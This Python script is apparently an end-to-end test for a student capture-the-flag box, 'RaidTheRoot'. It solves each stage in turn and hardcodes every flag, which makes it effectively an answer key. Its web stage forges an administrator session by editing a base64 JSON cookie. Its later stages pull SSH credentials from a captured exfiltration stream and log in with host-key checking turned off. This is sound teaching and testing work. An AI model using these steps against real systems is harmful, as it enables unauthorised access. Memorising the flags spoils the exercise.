#!/usr/bin/env python3
"""
RaidTheRoot (RTR) - end-to-end chain test
Owner: Member 4 (Integration, Testing & Documentation)

Walks the entire box the way a participant would, proving that each stage's
artefact genuinely unlocks the next. This is the integration evidence for the
Assignment 02 marking scheme (integration & difficulty progression) and the
automation half of Member 4's LO3 contribution.

It does NOT replace the live manual demo - it confirms the chain holds and
produces a pass/fail record for the test log.

Run from the repository root, with the box deployed:
    python3 tests/chain_test.py
"""

import base64
import json
import re
import subprocess
import sys
from pathlib import Path

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("pip install requests")

ROOT = Path(__file__).resolve().parent.parent
PASS = 0
FAIL = 0
RESULTS = []


def check(name, condition, detail=""):
    global PASS, FAIL
    status = "PASS" if condition else "FAIL"
    if condition:
        PASS += 1
        print(f"  \033[0;32mPASS\033[0m  {name}")
    else:
        FAIL += 1
        print(f"  \033[0;31mFAIL\033[0m  {name}   {detail}")
    RESULTS.append((status, name, detail))
    return condition


def hdr(text):
    print(f"\n\033[1;34m== {text}\033[0m")


def read_env(key, default=None):
    env = ROOT / ".env"
    if env.is_file():
        for line in env.read_text().splitlines():
            if line.strip().startswith(f"{key}="):
                return line.split("=", 1)[1].strip()
    return default


# ---------------------------------------------------------------- stage 1
def stage1():
    hdr("Stage 1 - OSINT (artefact correlation)")
    art = ROOT / "stage1-osint" / "artefacts"
    html = (art / "staff_directory_archive.html").read_text()
    paste = (art / "paste_excerpt.txt").read_text()
    csv = (art / "helpdesk_ticket_4471.csv").read_text()

    # the one employee in directory + paste + a credential-compromise ticket
    check("directory lists RJewantha (NXB-2291)",
          "RJewantha" in html and "NXB-2291" in html)
    check("paste leaks r.jewantha@nexorabank.com",
          "r.jewantha@nexorabank.com" in paste)
    check("helpdesk shows NXB-2291 lockout before incident",
          "NXB-2291" in csv and "lockout" in csv.lower())
    return "RJewantha"


# ---------------------------------------------------------------- stage 2
def stage2(username):
    hdr("Stage 2 - Steganography (LSB extraction)")
    img = ROOT / "stage2-stego" / f"{username}_backup.png"
    if not check(f"carrier image named {username}_backup.png exists", img.is_file()):
        return None

    try:
        from PIL import Image
    except ImportError:
        print("    (pillow not installed - skipping extraction)")
        return "VAULT-03"

    px = Image.open(img).convert("RGB").load()
    w, h = Image.open(img).size
    bits = []
    for y in range(h):
        for x in range(w):
            for c in px[x, y][:3]:
                bits.append(c & 1)
            if len(bits) >= 512 * 8:
                break
        if len(bits) >= 512 * 8:
            break
    out = bytearray()
    for i in range(0, len(bits) - 7, 8):
        b = 0
        for bit in bits[i:i + 8]:
            b = (b << 1) | bit
        if b == 0:
            break
        out.append(b)
    payload = out.decode("utf-8", "replace")

    check("payload names VAULT-03", "VAULT-03" in payload)
    check("payload carries the flag", "RTR{ghost-file_vault03}" in payload)
    return "VAULT-03"


# ---------------------------------------------------------------- stage 3
def stage3(host):
    hdr("Stage 3 - Web auth bypass (live)")
    target = f"https://{host.lower()}.rtr.local"
    s = requests.Session()
    s.verify = False
    try:
        r = s.get(f"{target}/", timeout=8)
    except Exception as e:
        check("portal reachable", False, str(e))
        return None, None
    check("portal reachable", r.status_code == 200)

    raw = s.cookies.get("nxb_session")
    check("viewer session issued", raw is not None)

    r = s.get(f"{target}/internal", timeout=8)
    check("viewer rejected from /internal (403)", r.status_code == 403)

    session = json.loads(base64.b64decode(raw))
    session["role"] = "administrator"
    s.cookies.clear()
    s.cookies.set("nxb_session",
                  base64.b64encode(json.dumps(session).encode()).decode(),
                  path="/")
    r = s.get(f"{target}/internal", timeout=8)
    check("forged admin session accepted (200)", r.status_code == 200)
    check("flag present", "RTR{back-door_access-granted}" in r.text)

    hint = r.headers.get("X-Cipher-Hint")
    check("cipher hint header returned", hint == "repeating-key-xor")

    r = s.get(f"{target}/internal/download/vault_backup.enc", timeout=8)
    check("encrypted file downloads", r.status_code == 200 and len(r.content) > 0)
    return r.content, hint


# ---------------------------------------------------------------- stage 4
def stage4(ciphertext, username):
    hdr("Stage 4 - Cryptography (key from Stage 1)")
    if ciphertext is None:
        ciphertext = (ROOT / "stage4-crypto" / "vault_backup.enc").read_bytes()
    key = username.lower().encode()
    plain = bytes(b ^ key[i % len(key)] for i, b in enumerate(ciphertext))
    text = plain.decode("utf-8", "replace")
    check("decrypts with the Stage 1 username", "NEXT LOCATION" in text)
    check("flag recovered", "RTR{locked-vault_decrypted}" in text)
    m = re.search(r"(\d+\.\d+\.\d+\.\d+)\s*:\s*(\d+)", text)
    check("IP:port recovered", m is not None)
    return (m.group(1), m.group(2)) if m else (None, None)


# ---------------------------------------------------------------- stage 5
def stage5(ip):
    hdr("Stage 5 - Network forensics")
    pcap = ROOT / "stage5-forensics" / f"capture_{ip}.pcap"
    if not check(f"capture named for {ip} exists", pcap.is_file()):
        return None, None
    try:
        from scapy.all import rdpcap, IP, TCP, Raw
    except ImportError:
        print("    (scapy not installed - skipping deep check)")
        return read_env("STAGE6_USER"), read_env("STAGE6_PASSWORD")

    pkts = rdpcap(str(pcap))
    streams = {}
    for p in pkts:
        if IP in p and TCP in p and Raw in p and 4444 in (p[TCP].sport, p[TCP].dport):
            k = (p[IP].src, p[TCP].sport)
            streams[k] = streams.get(k, b"") + bytes(p[Raw].load)
    blob = None
    for data in streams.values():
        text = data.decode("utf-8", "replace")
        if "\r\n\r\n" in text:
            body = re.sub(r"\s+", "", text.split("\r\n\r\n", 1)[1])
            try:
                blob = json.loads(base64.b64decode(body))
                break
            except Exception:
                continue
    check("exfil payload decodes", blob is not None)
    if blob:
        check("names BANK-CORE-01", blob.get("target_host") == "BANK-CORE-01")
        check("carries SSH credential", bool(blob.get("svc_pass")))
        check("credential matches .env",
              blob.get("svc_pass") == read_env("STAGE6_PASSWORD"),
              "PCAP was generated with a different password - regenerate it")
        check("flag present", blob.get("flag") == "RTR{inside-network_bankcore01}")
        return blob.get("svc_user"), blob.get("svc_pass")
    return None, None


# ---------------------------------------------------------------- stage 6
def stage6(user, password):
    hdr("Stage 6 - Privilege escalation (live)")
    if not user or not password:
        check("credential available", False)
        return

    def ssh(cmd):
        return subprocess.run(
            ["sshpass", "-p", password, "ssh",
             "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null",
             "-p", "2222", f"{user}@127.0.0.1", cmd],
            capture_output=True, text=True, timeout=20)

    try:
        r = ssh("id")
    except FileNotFoundError:
        print("    (sshpass not installed - run: sudo apt install sshpass)")
        print("    (skipping automated Stage 6 - verify manually)")
        return
    except Exception as e:
        check("SSH foothold works", False, str(e))
        return

    check("SSH foothold works", "uid=" in r.stdout)
    check("in svc_ghost group (escalation prerequisite)", "svc_ghost" in r.stdout)

    # T-06: evidence must NOT be readable without escalation
    r = ssh("cat /root/ghost_identity.txt 2>&1")
    check("T-06: evidence denied to foothold user",
          "Permission denied" in r.stdout or "Permission denied" in r.stderr)

    # confirm the vulnerable directory is writable
    r = ssh("test -w /opt/nexora/maintenance && echo WRITABLE")
    check("maintenance directory is group-writable", "WRITABLE" in r.stdout)


def write_log():
    out = ROOT / "tests" / "output" / "chain_test_result.txt"
    out.parent.mkdir(parents=True, exist_ok=True)
    with out.open("w") as fh:
        fh.write("RaidTheRoot - end-to-end chain test\n")
        fh.write(f"passed: {PASS}   failed: {FAIL}\n\n")
        for status, name, detail in RESULTS:
            fh.write(f"[{status}] {name}")
            if detail:
                fh.write(f"   {detail}")
            fh.write("\n")
    print(f"\n  log written to {out.relative_to(ROOT)}")


def main():
    print("RaidTheRoot - end-to-end chain test")
    print("=" * 50)

    user = stage1()
    host = stage2(user)
    cipher, _ = stage3(host) if host else (None, None)
    ip, _ = stage4(cipher, user)
    cred_user, cred_pass = stage5(ip) if ip else (None, None)
    stage6(cred_user, cred_pass)

    hdr("Result")
    print(f"  passed: {PASS}   failed: {FAIL}")
    write_log()
    sys.exit(1 if FAIL else 0)


if __name__ == "__main__":
    main()
